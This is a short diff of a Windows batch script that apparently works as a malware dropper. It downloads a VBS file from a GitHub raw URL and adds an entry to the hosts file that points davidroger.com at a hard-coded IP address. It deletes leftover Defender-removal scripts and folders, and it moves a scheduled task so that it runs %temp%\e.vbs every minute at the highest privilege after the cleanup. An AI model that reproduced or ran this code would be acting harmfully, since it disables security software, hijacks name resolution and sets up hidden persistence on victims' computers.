@@ -39,9 +39,6 @@ curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/rb.vbs
 echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts
 
 
-schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
-timeout /t 5
-
 cd %temp%
 del /f /q "s.bat"
 del /f /q "a.py"
@@ -56,6 +53,11 @@ del /f /q "RunDefenderRemover.vbs"
 del /f /q "DefenderRemover.bat"
 rmdir /s /q "Remove_SecurityComp"
 rmdir /s /q "Remove_Defender"
+
+
+schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
+timeout /t 5
+
 
 
 
